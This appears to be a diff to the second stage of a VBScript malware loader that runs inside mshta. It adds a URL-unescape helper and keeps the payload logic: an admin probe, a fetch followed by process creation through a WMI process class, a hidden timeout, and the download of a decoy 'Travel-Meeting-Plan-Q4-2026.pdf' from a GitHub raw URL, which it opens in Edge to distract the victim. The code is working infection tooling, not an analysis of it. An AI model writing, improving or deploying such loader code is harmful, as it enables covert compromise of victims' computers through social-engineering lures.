@@ -1,5 +1,38 @@
 ' language: VBScript, file: stage2.txt, delivery: fetched at runtime
-' runs via Execute() inside Stage 1's mshta process
+
+Function IsHex(s)
+    Dim n, c
+    IsHex = False
+    If Len(s) <> 2 Then Exit Function
+    For n = 1 To 2
+        c = UCase(Mid(s, n, 1))
+        If Not ((c >= "0" And c <= "9") Or (c >= "A" And c <= "F")) Then Exit Function
+    Next
+    IsHex = True
+End Function
+
+Function URLUnescape(s)
+    Dim out, i, c, hex
+    out = ""
+    i = 1
+    Do While i <= Len(s)
+        c = Mid(s, i, 1)
+        If c = "%" And i + 2 <= Len(s) Then
+            hex = Mid(s, i + 1, 2)
+            If IsHex(hex) Then
+                out = out & Chr(CLng("&H" & hex))
+                i = i + 3
+            Else
+                out = out & c
+                i = i + 1
+            End If
+        Else
+            out = out & c
+            i = i + 1
+        End If
+    Loop
+    URLUnescape = out
+End Function
 
 Dim fso, sh, qs, tmp, selfPath, isAdmin
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -7,9 +40,10 @@ Set sh  = CreateObject("WScript.Shell")
 qs  = Chr(34)
 tmp = sh.ExpandEnvironmentStrings("%TEMP%")
 
-' ---- self path via location.href (works because we're inside mshta) ----
+' ---- self path via location.href, unescaped ----
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
+selfPath = URLUnescape(selfPath)
 selfPath = Replace(selfPath, "/", "\")
 
 ' ---- admin probe ----
@@ -70,11 +104,10 @@ If fetchOk Then
     procClass.Create cmdLine, Null, startup, pid
 End If
 
-' ---- settle (timeout via cmd, no WScript.Sleep) ----
 sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul", 0, True
 
 ' ---- decoy PDF ----
-Dim pdfUrl, pdfPath, ph, ps, edgePath
+Dim pdfUrl, pdfPath, ph, ps, edgePath, candidates, c
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
@@ -96,9 +129,7 @@ If ph.status = 200 Then
     On Error GoTo 0
 
     If fso.FileExists(pdfPath) Then
-        ' -- dynamic Edge detection --
         edgePath = ""
-        Dim candidates, c
         candidates = Array( _
             sh.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Microsoft\Edge\Application\msedge.exe", _
             sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\Microsoft\Edge\Application\msedge.exe", _
